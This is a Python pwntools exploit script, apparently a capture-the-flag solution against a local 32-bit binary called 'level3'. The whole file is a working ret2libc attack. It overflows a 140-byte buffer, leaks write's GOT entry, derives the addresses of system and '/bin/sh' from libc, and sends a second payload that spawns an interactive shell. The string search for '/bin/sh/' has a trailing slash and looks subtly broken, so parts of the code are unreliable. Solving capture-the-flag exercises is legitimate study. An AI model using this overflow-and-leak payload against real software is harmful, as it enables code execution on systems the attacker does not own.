# -*- coding=utf-8 -*-
from pwn import *

libc = ELF("./libc_32.so.6")
elf = ELF("./level3")
     

io = process("./level3")     
     
payload = b"A"*140 #+b"A"*4    
write_addr = p32(elf.symbols[b'write'])

back_to_vul = p32(elf.symbols[b'vulnerable_function'])

param_1 = p32(0x1)
param_2 = p32(elf.got[b"write"])
param_3 = p32(0x4)

payload += write_addr + back_to_vul + param_1+param_2+param_3

#print(io.read())
io.sendline(payload)

got_write_address = u32(io.recv(4))

#print(got_write_address)
#print(io.read())


sh_addr = ""
for i in (libc.search(b"/bin/sh/")): #fuck generator

    print("i \n")
    sh_addr = i


print(sh_addr)
print(int(sh_addr))
system_addr = libc.symbols[b"system"]
write_addr = libc.symbols[b"write"]

write_sh_offset = write_addr - sh_addr
write_system_offset = write_addr - system_addr

sh = got_write_address - write_sh_offset
system = got_write_address - write_system_offset


print(io.read())

payload = b"B"*140 

payload += p32(system) + p32(0xcafebabe) + p32(sh)
io.sendline(payload)

io.interactive()


 
            





